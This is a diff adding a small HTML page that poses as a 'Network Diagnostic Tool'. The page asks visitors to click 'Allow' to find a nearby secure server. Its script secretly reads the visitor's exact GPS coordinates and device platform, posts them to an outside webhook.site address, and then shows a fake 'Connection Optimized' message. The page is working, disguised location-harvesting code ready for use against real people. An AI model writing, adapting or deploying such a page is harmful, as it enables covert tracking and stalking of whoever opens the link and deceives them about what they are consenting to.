@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Network Diagnostic Tool</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>Verifying Connection...</h2>
+    <p>Please click <b>"Allow"</b> to find the nearest secure server for your region.</p>
+
+    <script>
+        const webhookUrl = "https://webhook.site/a6190465-2192-445e-a98c-cdb63aaa9e23";
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                // Prepare the data
+                const gpsData = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy + " meters",
+                    device: navigator.platform
+                };
+
+                // Send data to your Webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(gpsData)
+                }).then(() => {
+                    document.body.innerHTML = "<h1>Verification Complete</h1><p>Connection Optimized.</p>";
+                });
+            }, function(error) {
+                document.body.innerHTML = "<h1>Error</h1><p>Location access denied. Cannot optimize connection.</p>";
+            });
+        }
+    </script>
+</body>
+</html>
